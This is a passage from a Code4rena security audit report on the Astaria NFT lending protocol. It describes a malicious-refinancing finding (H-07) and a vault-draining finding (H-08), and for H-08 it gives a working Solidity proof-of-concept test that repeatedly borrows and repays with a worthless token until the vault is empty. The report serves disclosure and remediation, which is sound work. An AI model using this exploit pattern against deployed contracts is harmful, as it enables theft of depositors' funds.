href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/366#event-8369739464\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#366</code></a></strong></p>\n<hr>\n<h2 id=\"h-07-malicious-refinancing-attack-could-lead-to-suboptimal-nft-liquidation\" style=\"position:relative;\"><a href=\"#h-07-malicious-refinancing-attack-could-lead-to-suboptimal-nft-liquidation\" aria-label=\"h 07 malicious refinancing attack could lead to suboptimal nft liquidation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/430\">[H-07] Malicious refinancing attack could lead to suboptimal NFT liquidation</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/430\">gtocoder</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/470\">peakbolt</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684</a></p>\n<p>A malicious refinancing with a very low <code>liquidationInitialAsk</code> just prior to a liquidation event could result in an NFT being liquidated for a price much lower than what the borrower wanted when signing up for the loan. Because refinancing is permission less, anyone can do this close to liquidation event resulting in the user being compensated less than fair price for their NFT.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Refinance checks are currently permission less, anyone can buyout a lien. This is fine because of the assumption that refinancing leads to a strictly optimal outcome in all cases to the borrower. This is true with respect to the loan duration, interest rate and overall debt parameters. However this is not the case with respect to the <code>liquidationInitialAsk</code> loan parameter.</p>\n<p>See code in <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/AstariaRouter.sol#L684</a> refinance checks do not take into account <code>liquidationInitialAsk</code> which is one of the loan parameters</p>\n<p>Imagine a user takes a loan for 3 ETH against an NFT with a high <code>liquidationInitialAsk</code> of 100 ETH which is a fair value of the NFT to the user. If they are not able to pay off the loan in time, they are assured ~97 ETH back assuming market conditions do not change. However a malicious refinancing done close to liquidation can set <code>liquidationInitialAsk</code> close to 0.</p>\n<p>This is possible because:</p>\n<ul>\n<li>Refinancing is permission less</li>\n<li>Since it’s close to liquidation, user has no time to react</li>\n</ul>\n<p>The malicious liquidator just needs to pay off the debt of 3 ETH and a minimal liquidation fee. Further, since they are aware of the initial ask in the NFT auction, they may be able to purchase the NFT for a very low price. The liquidator profits and the initial borrower does not receive a fair market value for their collateral.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Add checks that <code>liquidationInitialAsk</code> does not decrease during a refinance. Or set a <code>minimumLiquidationPrice</code> which is respected across all refinances</li>\n<li>Don’t allow refinances close to a liquidation event</li>\n<li>Don’t allow loans / refinances less than a minimum duration. May prevent other classes of surprises as well.</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/470#event-8369735155\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#470</code></a></strong></p>\n<hr>\n<h2 id=\"h-08-lack-of-strategydetailsparamvault-validation-allows-the-borrower-to-steal-all-the-funds-from-the-vault\" style=\"position:relative;\"><a href=\"#h-08-lack-of-strategydetailsparamvault-validation-allows-the-borrower-to-steal-all-the-funds-from-the-vault\" aria-label=\"h 08 lack of strategydetailsparamvault validation allows the borrower to steal all the funds from the vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/409\">[H-08] Lack of StrategyDetailsParam.vault validation allows the borrower to steal all the funds from the vault</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/409\">Koolex</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/559\">bin2chen</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L287</a></p>\n<p>When a borrower takes a loan, Strategy details are passed along with other required data, and through the overall <strong>commitToLien</strong> flow, all the data are validated except the StrategyDetailsParam.vault</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sh\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  struct StrategyDetailsParam {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint8 version;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 deadline;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address vault;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>A borrower then can pass different vault’s address, and when creating a lien this  vault is considered. Later, the borrower makes a payment, it reads the asset from this vault. Thus, the borrower can take loans and repay with whatever token.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L849</a></p>\n<h3 id=\"exploit-scenario\" style=\"position:relative;\"><a href=\"#exploit-scenario\" aria-label=\"exploit scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Scenario</h3>\n<p>Allow me to describe a scenario where the borrower can steal all the funds from all vaults that support his/her collateral:</p>\n<ol>\n<li><strong>Bob</strong> owns an NFT.</li>\n<li><strong>Bob</strong> sends his NFT to the collateral token contract.</li>\n<li><strong>Bob</strong> creates his own private vault <strong>BobVault</strong> with an asset that he created <strong>FakeToken</strong> which doesn’t have any value in the market (e.g. just a new ERC20 token).</li>\n<li><strong>Bob</strong> takes a loan from <strong>Vault1</strong> (while passing <strong>BobVault</strong> in the strategy param).</li>\n<li><strong>Bob</strong> pay the loan with his <strong>FakeToken</strong> instead <strong>Vault1</strong>’s asset.</li>\n<li><strong>Bob</strong> then repeats the steps from point 4 again till <strong>Vault1</strong> is drained.</li>\n<li><strong>Bob</strong> now has all the funds from <strong>Vault1</strong> with <strong>zero</strong> debt.</li>\n<li><strong>Strategist</strong> has the same amount of <strong>Vault1</strong>’s funds but in <strong>FakeToken</strong>.</li>\n</ol>\n<p>This exploit can be done with other vaults draining all the funds.<br>\nTo prove this, I’ve coded the scenario below.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Please create a file with a name <strong>StealAllFundsExploit.t.sol</strong> under <strong>src/test/</strong> directory.</li>\n<li>Add the following code to the file.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sh\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">pragma solidity =0.8.17;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import </span><span class=\"mtk8\">&quot;forge-std/Test.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {Authority} from </span><span class=\"mtk8\">&quot;solmate/auth/Auth.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {FixedPointMathLib} from </span><span class=\"mtk8\">&quot;solmate/utils/FixedPointMathLib.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {MockERC721} from </span><span class=\"mtk8\">&quot;solmate/test/utils/mocks/MockERC721.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  MultiRolesAuthority</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} from </span><span class=\"mtk8\">&quot;solmate/auth/authorities/MultiRolesAuthority.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {ERC721} from </span><span class=\"mtk8\">&quot;gpl/ERC721.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {SafeCastLib} from </span><span class=\"mtk8\">&quot;gpl/utils/SafeCastLib.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {IAstariaRouter, AstariaRouter} from </span><span class=\"mtk8\">&quot;../AstariaRouter.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {VaultImplementation} from </span><span class=\"mtk8\">&quot;../VaultImplementation.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {PublicVault} from </span><span class=\"mtk8\">&quot;../PublicVault.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {TransferProxy} from </span><span class=\"mtk8\">&quot;../TransferProxy.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {WithdrawProxy} from </span><span class=\"mtk8\">&quot;../WithdrawProxy.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import </span><span class=\"mtk8\">&quot;./TestHelpers.t.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {MockERC20} from </span><span class=\"mtk8\">&quot;solmate/test/utils/mocks/MockERC20.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">import {IVaultImplementation} from </span><span class=\"mtk8\">&quot;../interfaces/IVaultImplementation.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">contract AstariaTest is TestHelpers {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  using FixedPointMathLib </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> uint256;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  using CollateralLookup </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> address;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  using SafeCastLib </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> uint256;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ILienToken.Details public lienDetails =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ILienToken.Details({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        maxAmount: 50 ether,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        rate: (uint256(1e16) * 150) / (365 days),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        duration: 10 days,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        maxPotentialDebt: 50 ether,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        liquidationInitialAsk: 500 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">__createPrivateVault(address</span><span class=\"mtk1\"> strategist, address delegate,address token)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    returns (address privateVault)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    vm.startPrank(strategist);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    privateVault = ASTARIA_ROUTER.newVault(delegate, token);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">vm.stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testPayWithDifferentAsset()</span><span class=\"mtk1\"> public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    TestNFT nft = new TestNFT(2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address tokenContract = address(nft);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 initialBalance = WETH9.balanceOf(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Create a private vault with WETH asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address privateVault = __createPrivateVault({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strategist: strategistOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      delegate: address(0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      token: address(WETH9)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _lendToPrivateVault(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      Lender({addr: strategistOne, amountToLend: 500 ether}),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      privateVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Send the NFT to Collateral contract and receive Collateral token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ERC721(tokenContract).safeTransferFrom(address(this),address(COLLATERAL_TOKEN),1,</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // generate valid terms</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 amount = 50 ether; // amount to borrow        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IAstariaRouter.Commitment memory c = _generateValidTerms({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      vault: privateVault,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strategist: strategistOne,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strategistPK: strategistOnePK,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      tokenContract: tokenContract,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      tokenId: 1,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      lienDetails: lienDetails,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      amount: amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      stack: new ILienToken.Stack[](0)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Attack starts here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // The borrower an asset which has no value </span><span class=\"mtk15\">in</span><span class=\"mtk1\"> the market</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    MockERC20 FakeToken = new MockERC20(</span><span class=\"mtk8\">&quot;USDC&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;FakeAsset&quot;</span><span class=\"mtk1\">, 18); // this could be any ERC token created by the attacker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    FakeToken.mint(address(this),500 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // The borrower creates a private vault with his/her asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address privateVaultOfBorrower = __createPrivateVault({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strategist: address(this),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      delegate: address(0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      token: address(FakeToken)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint8 i;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    for( ; i &lt; 10 ; i ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      // Here is the exploit: commitToLien on privateVault </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> passing differentVault </span><span class=\"mtk15\">in</span><span class=\"mtk1\"> the strategy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      c.lienRequest.strategy.vault = privateVaultOfBorrower;   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (uint256 lienId, ILienToken.Stack[] memory stack , uint256 payout) = IVaultImplementation(privateVault).commitToLien(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          c,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          address(this)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      console.log(</span><span class=\"mtk8\">&quot;Take 50 ether loan#%d&quot;</span><span class=\"mtk1\">, (i+1));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      // necessary approvals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      FakeToken.approve(address(TRANSFER_PROXY), amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      FakeToken.approve(address(LIEN_TOKEN), amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      // pay the loan with FakeToken </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ILienToken.Stack[] memory newStack = LIEN_TOKEN.makePayment(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        stack[0].lien.collateralId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        stack,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        uint8(0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      console.log(</span><span class=\"mtk8\">&quot;Repay 50 FakeToken loan#%d&quot;</span><span class=\"mtk1\">, (i+1));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // assertion</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    console.log(</span><span class=\"mtk8\">&quot;------&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Vault is drained</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    console.log(</span><span class=\"mtk8\">&quot;PrivateVault Balance: %d WETH&quot;</span><span class=\"mtk1\">, WETH9.balanceOf(privateVault));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    assertEq(WETH9.balanceOf(privateVault), 0); </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // The borrower gets 500 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    console.log(</span><span class=\"mtk8\">&quot;Borrower Balance: %d WETH&quot;</span><span class=\"mtk1\">, WETH9.balanceOf(address(this)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    assertEq(WETH9.balanceOf(address(this)), initialBalance + 500 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // strategist receives the fake token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    console.log(</span><span class=\"mtk8\">&quot;Strategist Balance: %d FakeToken&quot;</span><span class=\"mtk1\">, FakeToken.balanceOf(strategistOne));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    assertEq(FakeToken.balanceOf(strategistOne), 500 